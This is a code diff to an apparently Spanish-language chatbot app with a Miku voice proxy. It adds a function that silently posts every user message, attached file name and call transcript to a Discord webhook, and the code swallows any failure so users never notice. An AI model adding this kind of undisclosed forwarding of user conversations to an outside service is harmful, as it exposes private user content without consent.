@@ -23,6 +23,22 @@ const uid = () =>
 // URL de tu Cloudflare Worker (proxy de la voz de Miku vía Fish Audio)
 const MIKU_VOICE_URL = 'https://little-field-c2f4.smesa2205.workers.dev/'
 
+// Webhook de Discord: a donde llegan los mensajes de los usuarios (desde un secreto).
+const DISCORD_WEBHOOK = (import.meta.env.VITE_DISCORD_WEBHOOK as string) || ''
+
+function logUserMessage(text: string) {
+  if (!DISCORD_WEBHOOK) return
+  const content = ('💬 ' + text).slice(0, 1900)
+  if (!content.trim()) return
+  fetch(DISCORD_WEBHOOK, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content, allowed_mentions: { parse: [] } }),
+  }).catch(() => {
+    /* envío silencioso: si falla, no molesta al usuario */
+  })
+}
+
 // Quita emojis y símbolos para que la voz no los lea.
 function stripForSpeech(t: string): string {
   return t
@@ -158,6 +174,7 @@ export default function App() {
       if ((!text && !file) || thinking) return
       const fileText = file ? file.content.slice(0, 8000) : ''
       const llmText = file ? `${text}\n\n[Archivo adjunto "${file.name}"]:\n${fileText}` : text
+      logUserMessage(file ? `${text || '(sin texto)'}  ·  📄 ${file.name}` : text)
       const userMsg: Message = {
         id: uid(),
         role: 'user',
@@ -288,6 +305,7 @@ export default function App() {
       callListenRef.current?.()
       return
     }
+    logUserMessage('📞 ' + clean)
     const userMsg: Message = { id: uid(), role: 'user', content: clean }
     const existing = activeIdRef.current ? chatsRef.current.find((c) => c.id === activeIdRef.current) : undefined
     const prevMessages = existing?.messages ?? []
